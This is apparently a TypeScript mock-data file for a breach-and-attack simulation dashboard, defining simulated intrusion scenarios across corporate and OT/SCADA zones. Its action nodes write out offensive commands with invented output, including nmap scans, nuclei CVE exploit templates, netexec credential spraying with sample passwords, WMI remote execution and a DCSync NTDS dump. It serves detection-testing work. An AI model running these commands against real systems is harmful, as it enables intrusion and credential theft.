    { node_id:'n2-act19', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.30.2.5',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 135,445,3389',
      node_executed_at:'2026-06-05T09:48:00Z', node_agent:'openaev', node_ip:'10.30.2.5',
      node_expectations:[{expectation_id:'n2-e19',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 135/tcp msrpc, 445/tcp smb, 3389/tcp rdp. All open on OT-ENG-01` },
    { node_id:'n2-act20', node_type:'ACTION', node_label:'nuclei – CVE-2023-4966 — 10.30.0.20',
      node_status:'detected', node_payload_name:'nuclei – CVE-2023-4966',
      node_command:'nuclei', node_arguments:'-u https://10.30.0.20 -t cves/2023/CVE-2023-4966.yaml',
      node_executed_at:'2026-06-05T10:00:00Z', node_agent:'sentinel_one', node_ip:'10.30.0.20',
      node_expectations:[{expectation_id:'n2-e20',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-4966] Citrix Bleed session token theft. DETECTION: WAF alert triggered` },
    { node_id:'n2-act21', node_type:'ACTION', node_label:'netexec – MSSQL enum — 10.30.1.15',
      node_status:'undetected', node_payload_name:'netexec – MSSQL enum',
      node_command:'netexec', node_arguments:'mssql 10.30.1.15 -u SCADA\\admin -p Plant@2024',
      node_executed_at:'2026-06-05T10:12:00Z', node_agent:'palo_alto', node_ip:'10.30.1.15',
      node_expectations:[{expectation_id:'n2-e21',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`MSSQL [+] SCADA\\admin → SCADA_DB, AlarmDB, EventDB enumerated` },
    { node_id:'n2-act22', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.30.2.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 445,3389,5985',
      node_executed_at:'2026-06-05T10:24:00Z', node_agent:'openaev', node_ip:'10.30.2.10',
      node_expectations:[{expectation_id:'n2-e22',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 445/tcp smb, 3389/tcp rdp, 5985/tcp winrm open on OT-WS-01` },
    { node_id:'n2-act23', node_type:'ACTION', node_label:'netexec – WMI exec — 10.30.2.11',
      node_status:'undetected', node_payload_name:'netexec – WMI exec',
      node_command:'netexec', node_arguments:'wmi 10.30.2.11 -u SCADA\\admin -p Plant@2024 -x whoami',
      node_executed_at:'2026-06-05T10:36:00Z', node_agent:'palo_alto', node_ip:'10.30.2.11',
      node_expectations:[{expectation_id:'n2-e23',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`WMI [+] SCADA\\admin (Pwn3d!) on OT-WS-02 → SCADA\\admin` },
    { node_id:'n2-act24', node_type:'ACTION', node_label:'nuclei – CVE-2021-21985 — 10.30.2.12',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-21985',
      node_command:'nuclei', node_arguments:'-u https://10.30.2.12 -t cves/2021/CVE-2021-21985.yaml',
      node_executed_at:'2026-06-05T10:48:00Z', node_agent:'sentinel_one', node_ip:'10.30.2.12',
      node_expectations:[{expectation_id:'n2-e24',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-21985] [critical] VMware vCenter RCE on OT-WS-03 → reverse shell obtained` },
    { node_id:'n2-act25', node_type:'ACTION', node_label:'netexec – SMB shares — 10.30.3.5',
      node_status:'undetected', node_payload_name:'netexec – SMB shares',
      node_command:'netexec', node_arguments:'smb 10.30.3.5 -u SCADA\\admin -p Plant@2024 --shares',
      node_executed_at:'2026-06-05T11:00:00Z', node_agent:'openaev', node_ip:'10.30.3.5',
      node_expectations:[{expectation_id:'n2-e25',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] OT-JUMP-01 shares: C$, ADMIN$, OT-Configs. Config files downloaded` },
    { node_id:'n2-act26', node_type:'ACTION', node_label:'nuclei – CVE-2022-1388 — 10.30.1.20',
      node_status:'prevented', node_payload_name:'nuclei – CVE-2022-1388',
      node_command:'nuclei', node_arguments:'-u http://10.30.1.20 -t cves/2022/CVE-2022-1388.yaml',
      node_executed_at:'2026-06-05T11:12:00Z', node_agent:'sentinel_one', node_ip:'10.30.1.20',
      node_expectations:[{expectation_id:'n2-e26',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-1388] PREVENTION: F5 BIG-IP auth bypass BLOCKED by WAF rule 10234` },
    { node_id:'n2-act27', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.30.1.25',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 22,502,4840',
      node_executed_at:'2026-06-05T11:24:00Z', node_agent:'openaev', node_ip:'10.30.1.25',
      node_expectations:[{expectation_id:'n2-e27',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh OpenSSH, 502/tcp modbus, 4840/tcp opcua open` },
    { node_id:'n2-act28', node_type:'ACTION', node_label:'netexec – SSH login — 10.30.3.10',
      node_status:'undetected', node_payload_name:'netexec – SSH login',
      node_command:'netexec', node_arguments:'ssh 10.30.3.10 -u ubuntu -p ubuntu123',
      node_executed_at:'2026-06-05T11:36:00Z', node_agent:'openaev', node_ip:'10.30.3.10',
      node_expectations:[{expectation_id:'n2-e28',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SSH [+] ubuntu:ubuntu123 on OT-LOG-01. Syslog files accessible` },
    { node_id:'n2-act29', node_type:'ACTION', node_label:'nuclei – CVE-2021-22205 — 10.30.0.25',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-22205',
      node_command:'nuclei', node_arguments:'-u http://10.30.0.25:8080 -t cves/2021/CVE-2021-22205.yaml',
      node_executed_at:'2026-06-05T11:48:00Z', node_agent:'sentinel_one', node_ip:'10.30.0.25',
      node_expectations:[{expectation_id:'n2-e29',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-22205] [critical] GitLab RCE on OT-APP-01 → foothold established` },
    { node_id:'n2-act30', node_type:'ACTION', node_label:'netexec – LDAP DCSync — 10.30.3.15',
      node_status:'undetected', node_payload_name:'netexec – LDAP DCSync',
      node_command:'netexec', node_arguments:'ldap 10.30.3.15 -u SCADA\\Administrator -p $HASH --ntds',
      node_executed_at:'2026-06-05T12:00:00Z', node_agent:'openaev', node_ip:'10.30.3.15',
      node_expectations:[{expectation_id:'n2-e30',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`LDAP [+] SCADA\\Administrator DCSync → NTDS.dit extracted (342 domain accounts)` },
    // ── Multi-variant: SMB credential spray on n2-ep02 (10.20.1.11) — 8 username:password combos ──
    { node_id:'n2-act02b', node_type:'ACTION', node_label:'netexec – SMB credential spray — admin:admin',
      node_status:'prevented', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u admin -p admin --no-bruteforce',
      node_executed_at:'2026-06-05T08:12:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.11',
      node_expectations:[{expectation_id:'n2-e02b',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.11  445  CORP-APP-02  [-] CORP\\admin:admin STATUS_LOGON_FAILURE\n[!] PREVENTION: Account lockout policy triggered` },
    { node_id:'n2-act02c', node_type:'ACTION', node_label:'netexec – SMB credential spray — admin:Password1',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u admin -p Password1 --no-bruteforce',
      node_executed_at:'2026-06-05T08:14:00Z', node_agent:'openaev', node_ip:'10.20.1.11',
      node_expectations:[{expectation_id:'n2-e02c',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.11  445  CORP-APP-02  [-] CORP\\admin:Password1 STATUS_LOGON_FAILURE` },
    { node_id:'n2-act02d', node_type:'ACTION', node_label:'netexec – SMB credential spray — admin:Summer2024!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u admin -p Summer2024! --no-bruteforce',
      node_executed_at:'2026-06-05T08:16:00Z', node_agent:'palo_alto', node_ip:'10.20.1.11',
      node_expectations:[{expectation_id:'n2-e02d',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.11  445  CORP-APP-02  [-] CORP\\admin:Summer2024! STATUS_LOGON_FAILURE` },
    { node_id:'n2-act02e', node_type:'ACTION', node_label:'netexec – SMB credential spray — admin:Corp@2024! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u admin -p Corp@2024! --shares',
      node_executed_at:'2026-06-05T08:18:00Z', node_agent:'palo_alto', node_ip:'10.20.1.11',
      node_credentials_found:['CORP\\admin:Corp@2024!'],
      node_accessed_files:['C:\\AppServer\\config.json'],
      node_expectations:[{expectation_id:'n2-e02e',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.11  445  CORP-APP-02  [+] CORP\\admin:Corp@2024! (Pwn3d!)\nSMB    10.20.1.11  C$, ADMIN$ → config.json extracted` },
    { node_id:'n2-act02f', node_type:'ACTION', node_label:'netexec – SMB credential spray — svc_web:WebSvc!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u svc_web -p WebSvc! --shares',
      node_executed_at:'2026-06-05T08:20:00Z', node_agent:'openaev', node_ip:'10.20.1.11',
      node_expectations:[{expectation_id:'n2-e02f',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.11  445  CORP-APP-02  [-] CORP\\svc_web:WebSvc! STATUS_LOGON_FAILURE` },
    { node_id:'n2-act02g', node_type:'ACTION', node_label:'netexec – SMB credential spray — svc_web:Welcome1!',
      node_status:'detected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u svc_web -p Welcome1! --shares',
      node_executed_at:'2026-06-05T08:22:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.11',
      node_expectations:[{expectation_id:'n2-e02g',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.11  445  CORP-APP-02  [+] CORP\\svc_web:Welcome1! (Pwn3d!)\n[!] DETECTION: CrowdStrike alert — credential spray activity from 192.168.100.50` },
    // ── Multi-variant: nmap port scans on n2-ep01 (10.20.0.10) with different port sets ──
    { node_id:'n2-act01b', node_type:'ACTION', node_label:'nmap – Service Scan — 10.20.0.10',
      node_status:'undetected', node_payload_name:'nmap – Service Scan',
      node_command:'nmap', node_arguments:'-sV -T4 -p 22,80,443,8080,8443 10.20.0.10',
      node_executed_at:'2026-06-05T08:04:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'n2-e01b',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh OpenSSH 8.2, 80/tcp nginx 1.24, 443/tcp ssl/nginx, 8080/tcp Tomcat 9.0.65`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.2p1 Ubuntu', '80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '8080/tcp open http Apache Tomcat 9.0.65', '8443/tcp closed https-alt'] },
    { node_id:'n2-act01c', node_type:'ACTION', node_label:'nmap – UDP Scan — 10.20.0.10',
      node_status:'undetected', node_payload_name:'nmap – UDP Scan',
      node_command:'nmap', node_arguments:'-sU -T4 -p 53,161,500 10.20.0.10',
      node_executed_at:'2026-06-05T08:06:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'n2-e01c',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 53/udp domain open, 161/udp snmp open (community string: public)`,
      node_ports_found:['53/udp open domain ISC BIND 9.16.1', '161/udp open snmp (community: public)', '500/udp open isakmp'] },
    { node_id:'n2-act01d', node_type:'ACTION', node_label:'nmap – Full Port Scan — 10.20.0.10',
      node_status:'detected', node_payload_name:'nmap – Full Port Scan',
      node_command:'nmap', node_arguments:'-p- -T4 --min-rate 5000 10.20.0.10',
      node_executed_at:'2026-06-05T08:08:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'n2-e01d',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`[!] DETECTION: Firewall alert — full port scan detected from 192.168.100.50`,
      node_ports_found:['22/tcp open ssh', '80/tcp open http', '443/tcp open https', '8080/tcp open http', '8443/tcp open ssl', '33060/tcp open mysqlx'] },
    { node_id:'n2-act01e', node_type:'ACTION', node_label:'nmap – Vuln Script Scan — 10.20.0.10',
      node_status:'undetected', node_payload_name:'nmap – Vuln Script Scan',
      node_command:'nmap', node_arguments:'--script vuln -p 80,443,8080 10.20.0.10',
      node_executed_at:'2026-06-05T08:10:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'n2-e01e',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[vuln] http-shellshock: VULNERABLE — CVE-2014-6271 on /cgi-bin/status.cgi`,
      node_ports_found:['80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '8080/tcp open http Tomcat 9.0.65'],
      node_cves_found:['CVE-2014-6271 (Shellshock) - CRITICAL', 'CVE-2023-27898 (Jenkins RCE unauthenticated) - CRITICAL'] },
  ],
  attack_path_edges: [
    { edge_id:'n2-al-01', edge_type:'asset_link', edge_source:'n2-act01', edge_target:'n2-ep01' },
    { edge_id:'n2-al-01b', edge_type:'asset_link', edge_source:'n2-act01b', edge_target:'n2-ep01' },
    { edge_id:'n2-al-01c', edge_type:'asset_link', edge_source:'n2-act01c', edge_target:'n2-ep01' },
    { edge_id:'n2-al-01d', edge_type:'asset_link', edge_source:'n2-act01d', edge_target:'n2-ep01' },
    { edge_id:'n2-al-01e', edge_type:'asset_link', edge_source:'n2-act01e', edge_target:'n2-ep01' },
    { edge_id:'n2-al-02', edge_type:'asset_link', edge_source:'n2-act02', edge_target:'n2-ep02' },
    { edge_id:'n2-al-02b', edge_type:'asset_link', edge_source:'n2-act02b', edge_target:'n2-ep02' },
    { edge_id:'n2-al-02c', edge_type:'asset_link', edge_source:'n2-act02c', edge_target:'n2-ep02' },
    { edge_id:'n2-al-02d', edge_type:'asset_link', edge_source:'n2-act02d', edge_target:'n2-ep02' },
    { edge_id:'n2-al-02e', edge_type:'asset_link', edge_source:'n2-act02e', edge_target:'n2-ep02' },
    { edge_id:'n2-al-02f', edge_type:'asset_link', edge_source:'n2-act02f', edge_target:'n2-ep02' },
    { edge_id:'n2-al-02g', edge_type:'asset_link', edge_source:'n2-act02g', edge_target:'n2-ep02' },
    { edge_id:'n2-al-03', edge_type:'asset_link', edge_source:'n2-act03', edge_target:'n2-ep03' },
    { edge_id:'n2-al-04', edge_type:'asset_link', edge_source:'n2-act04', edge_target:'n2-ep04' },
    { edge_id:'n2-al-05', edge_type:'asset_link', edge_source:'n2-act05', edge_target:'n2-ep05' },
    { edge_id:'n2-al-06', edge_type:'asset_link', edge_source:'n2-act06', edge_target:'n2-ep06' },
    { edge_id:'n2-al-07', edge_type:'asset_link', edge_source:'n2-act07', edge_target:'n2-ep07' },
    { edge_id:'n2-al-08', edge_type:'asset_link', edge_source:'n2-act08', edge_target:'n2-ep08' },
    { edge_id:'n2-al-09', edge_type:'asset_link', edge_source:'n2-act09', edge_target:'n2-ep09' },
    { edge_id:'n2-al-10', edge_type:'asset_link', edge_source:'n2-act10', edge_target:'n2-ep10' },
    { edge_id:'n2-al-11', edge_type:'asset_link', edge_source:'n2-act11', edge_target:'n2-ep11' },
    { edge_id:'n2-al-12', edge_type:'asset_link', edge_source:'n2-act12', edge_target:'n2-ep12' },
    { edge_id:'n2-al-13', edge_type:'asset_link', edge_source:'n2-act13', edge_target:'n2-ep13' },
    { edge_id:'n2-al-14', edge_type:'asset_link', edge_source:'n2-act14', edge_target:'n2-ep14' },
    { edge_id:'n2-al-15', edge_type:'asset_link', edge_source:'n2-act15', edge_target:'n2-ep15' },
    { edge_id:'n2-al-16', edge_type:'asset_link', edge_source:'n2-act16', edge_target:'n2-ep16' },
    { edge_id:'n2-al-17', edge_type:'asset_link', edge_source:'n2-act17', edge_target:'n2-ep17' },
    { edge_id:'n2-al-18', edge_type:'asset_link', edge_source:'n2-act18', edge_target:'n2-ep18' },
    { edge_id:'n2-al-19', edge_type:'asset_link', edge_source:'n2-act19', edge_target:'n2-ep19' },
    { edge_id:'n2-al-20', edge_type:'asset_link', edge_source:'n2-act20', edge_target:'n2-ep20' },
    { edge_id:'n2-al-21', edge_type:'asset_link', edge_source:'n2-act21', edge_target:'n2-ep21' },
    { edge_id:'n2-al-22', edge_type:'asset_link', edge_source:'n2-act22', edge_target:'n2-ep22' },
    { edge_id:'n2-al-23', edge_type:'asset_link', edge_source:'n2-act23', edge_target:'n2-ep23' },
    { edge_id:'n2-al-24', edge_type:'asset_link', edge_source:'n2-act24', edge_target:'n2-ep24' },
    { edge_id:'n2-al-25', edge_type:'asset_link', edge_source:'n2-act25', edge_target:'n2-ep25' },
    { edge_id:'n2-al-26', edge_type:'asset_link', edge_source:'n2-act26', edge_target:'n2-ep26' },
    { edge_id:'n2-al-27', edge_type:'asset_link', edge_source:'n2-act27', edge_target:'n2-ep27' },
    { edge_id:'n2-al-28', edge_type:'asset_link', edge_source:'n2-act28', edge_target:'n2-ep28' },
    { edge_id:'n2-al-29', edge_type:'asset_link', edge_source:'n2-act29', edge_target:'n2-ep29' },
    { edge_id:'n2-al-30', edge_type:'asset_link', edge_source:'n2-act30', edge_target:'n2-ep30' },
  ],
  attack_path_stats: {
    stats_prevented:1, stats_detected:3, stats_undetected:26,
    stats_pending:20, stats_total_actions:30, stats_executed_actions:30,
    stats_captured_endpoints:30, stats_captured_files:15, stats_captured_credentials:18,
 stats_captured_users: 13,
 stats_captured_cves: 8,
  },
  attack_path_definitions: [
    { path_id:'n2-p1', path_name:'Corporate Zone Compromise', path_color:'#f44336', node_ids:['n2-ep01','n2-ep02','n2-ep03','n2-ep04','n2-ep05','n2-ep06','n2-ep07','n2-ep08','n2-ep09','n2-ep10','n2-ep11','n2-ep12','n2-ep13','n2-ep14','n2-ep15'], path_outcome:'success' },
    { path_id:'n2-p2', path_name:'OT/SCADA Zone Infiltration', path_color:'#ff9800', node_ids:['n2-ep16','n2-ep17','n2-ep18','n2-ep19','n2-ep20','n2-ep21','n2-ep22','n2-ep23','n2-ep24','n2-ep25','n2-ep26','n2-ep27','n2-ep28','n2-ep29','n2-ep30'], path_outcome:'success' },
  ],
};

// ══════════════════════════════════════════════════════════════════════════════
// NEW SCENARIO D — APT Lateral Movement Campaign (60 eps: 30 used + 30 untouched, 10 pivots)
// Real-world: Nation-state APT performs targeted intrusion with extensive AD lateral movement.
// Initial access via web exploit → credential harvesting → 10 endpoint-to-endpoint pivots.
// ══════════════════════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_NEW_60EP_LATERAL: AttackPathData = {
  attack_path_nodes: [
    { node_id:'n3-ep01', node_type:'ASSET', node_label:'CORP-WEB-01', node_hostname:'CORP-WEB-01', node_ip:'10.40.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DMZ', node_subnet:'10.40.0.0/24', node_is_entry_point:true, node_is_pivot:true, node_agents:['palo_alto', 'openaev'], },
    { node_id:'n3-ep02', node_type:'ASSET', node_label:'CORP-DMZ-01', node_hostname:'CORP-DMZ-01', node_ip:'10.40.0.20', node_platform:'Red Hat 8', node_status:'undetected', node_zone:'DMZ', node_subnet:'10.40.0.0/24', node_is_pivot:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep03', node_type:'ASSET', node_label:'CORP-APP-01', node_hostname:'CORP-APP-01', node_ip:'10.40.1.10', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'App', node_subnet:'10.40.1.0/24', node_agents:['sentinel_one'], },
    { node_id:'n3-ep04', node_type:'ASSET', node_label:'CORP-FILE-01', node_hostname:'CORP-FILE-01', node_ip:'10.40.1.20', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'File', node_subnet:'10.40.1.0/24', node_agents:['sentinel_one'], },
    { node_id:'n3-ep05', node_type:'ASSET', node_label:'CORP-DC-01', node_hostname:'CORP-DC-01', node_ip:'10.40.2.5', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Core', node_subnet:'10.40.2.0/24', node_is_pivot:true, node_agents:['palo_alto', 'openaev'], },
    { node_id:'n3-ep06', node_type:'ASSET', node_label:'CORP-EXCH-01', node_hostname:'CORP-EXCH-01', node_ip:'10.40.2.10', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Core', node_subnet:'10.40.2.0/24', node_agents:['sentinel_one'], },
    { node_id:'n3-ep07', node_type:'ASSET', node_label:'CORP-SQL-01', node_hostname:'CORP-SQL-01', node_ip:'10.40.1.30', node_platform:'Windows Server 2022', node_status:'detected', node_zone:'DB', node_subnet:'10.40.1.0/24', node_agents:['openaev'], },
    { node_id:'n3-ep08', node_type:'ASSET', node_label:'CORP-WS-01', node_hostname:'CORP-WS-01', node_ip:'10.40.3.10', node_platform:'Windows 11', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.40.3.0/24', node_is_pivot:true, node_agents:['palo_alto', 'sentinel_one'], },
    { node_id:'n3-ep09', node_type:'ASSET', node_label:'CORP-WS-02', node_hostname:'CORP-WS-02', node_ip:'10.40.3.11', node_platform:'Windows 11', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.40.3.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep10', node_type:'ASSET', node_label:'CORP-WS-03', node_hostname:'CORP-WS-03', node_ip:'10.40.3.12', node_platform:'Windows 11', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.40.3.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep11', node_type:'ASSET', node_label:'FIN-WS-01', node_hostname:'FIN-WS-01', node_ip:'10.40.4.10', node_platform:'Windows 11', node_status:'undetected', node_zone:'Finance', node_subnet:'10.40.4.0/24', node_is_pivot:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep12', node_type:'ASSET', node_label:'FIN-WS-02', node_hostname:'FIN-WS-02', node_ip:'10.40.4.11', node_platform:'Windows 11', node_status:'undetected', node_zone:'Finance', node_subnet:'10.40.4.0/24', node_is_pivot:true, node_agents:['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id:'n3-ep13', node_type:'ASSET', node_label:'FIN-DB-01', node_hostname:'FIN-DB-01', node_ip:'10.40.4.20', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Finance', node_subnet:'10.40.4.0/24', node_agents:['palo_alto'], },
    { node_id:'n3-ep14', node_type:'ASSET', node_label:'FIN-DC-01', node_hostname:'FIN-DC-01', node_ip:'10.40.4.5', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Finance', node_subnet:'10.40.4.0/24', node_is_pivot:true, node_agents:['palo_alto', 'openaev'], },
    { node_id:'n3-ep15', node_type:'ASSET', node_label:'FIN-FILE-01', node_hostname:'FIN-FILE-01', node_ip:'10.40.4.30', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Finance', node_subnet:'10.40.4.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep16', node_type:'ASSET', node_label:'HR-WS-01', node_hostname:'HR-WS-01', node_ip:'10.40.5.10', node_platform:'Windows 11', node_status:'undetected', node_zone:'HR', node_subnet:'10.40.5.0/24', node_agents:['palo_alto'], },
    { node_id:'n3-ep17', node_type:'ASSET', node_label:'HR-WS-02', node_hostname:'HR-WS-02', node_ip:'10.40.5.11', node_platform:'Windows 11', node_status:'detected', node_zone:'HR', node_subnet:'10.40.5.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep18', node_type:'ASSET', node_label:'HR-DB-01', node_hostname:'HR-DB-01', node_ip:'10.40.5.20', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'HR', node_subnet:'10.40.5.0/24', node_agents:['sentinel_one'], },
    { node_id:'n3-ep19', node_type:'ASSET', node_label:'IT-MGMT-01', node_hostname:'IT-MGMT-01', node_ip:'10.40.6.5', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'IT Mgmt', node_subnet:'10.40.6.0/24', node_is_pivot:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep20', node_type:'ASSET', node_label:'IT-JUMP-01', node_hostname:'IT-JUMP-01', node_ip:'10.40.6.10', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'IT Mgmt', node_subnet:'10.40.6.0/24', node_is_pivot:true, node_agents:['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id:'n3-ep21', node_type:'ASSET', node_label:'OPS-WS-01', node_hostname:'OPS-WS-01', node_ip:'10.40.7.10', node_platform:'Windows 11', node_status:'undetected', node_zone:'Operations', node_subnet:'10.40.7.0/24', node_agents:['palo_alto'], },
    { node_id:'n3-ep22', node_type:'ASSET', node_label:'OPS-WS-02', node_hostname:'OPS-WS-02', node_ip:'10.40.7.11', node_platform:'Windows 10', node_status:'undetected', node_zone:'Operations', node_subnet:'10.40.7.0/24', node_agents:['openaev'], },
    { node_id:'n3-ep23', node_type:'ASSET', node_label:'OPS-DB-01', node_hostname:'OPS-DB-01', node_ip:'10.40.7.20', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Operations', node_subnet:'10.40.7.0/24', node_agents:['sentinel_one'], },
    { node_id:'n3-ep24', node_type:'ASSET', node_label:'EXEC-WS-01', node_hostname:'EXEC-WS-01', node_ip:'10.40.8.10', node_platform:'Windows 11', node_status:'undetected', node_zone:'Executive', node_subnet:'10.40.8.0/24', node_is_pivot:true, node_agents:['palo_alto', 'sentinel_one'], },
    { node_id:'n3-ep25', node_type:'ASSET', node_label:'EXEC-WS-02', node_hostname:'EXEC-WS-02', node_ip:'10.40.8.11', node_platform:'macOS Sonoma 14.4', node_status:'undetected', node_zone:'Executive', node_subnet:'10.40.8.0/24', node_is_pivot:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep26', node_type:'ASSET', node_label:'BACKUP-SRV-01', node_hostname:'BACKUP-SRV-01', node_ip:'10.40.9.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'Backup', node_subnet:'10.40.9.0/24', node_agents:['sentinel_one'], },
    { node_id:'n3-ep27', node_type:'ASSET', node_label:'BACKUP-SRV-02', node_hostname:'BACKUP-SRV-02', node_ip:'10.40.9.11', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'Backup', node_subnet:'10.40.9.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep28', node_type:'ASSET', node_label:'CORP-DC-02', node_hostname:'CORP-DC-02', node_ip:'10.40.2.6', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Core', node_subnet:'10.40.2.0/24', node_is_pivot:true, node_agents:['palo_alto', 'sentinel_one'], },
    { node_id:'n3-ep29', node_type:'ASSET', node_label:'FOREST-DC-01', node_hostname:'FOREST-DC-01', node_ip:'10.40.10.5', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Forest Root', node_subnet:'10.40.10.0/24', node_is_pivot:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep30', node_type:'ASSET', node_label:'FINAL-DC-01', node_hostname:'FINAL-DC-01', node_ip:'10.40.10.10', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Forest Root', node_subnet:'10.40.10.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep31', node_type:'ASSET', node_label:'CORP-SPARE-31', node_hostname:'CORP-SPARE-31', node_ip:'10.99.0.1', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep32', node_type:'ASSET', node_label:'CORP-SPARE-32', node_hostname:'CORP-SPARE-32', node_ip:'10.99.0.2', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
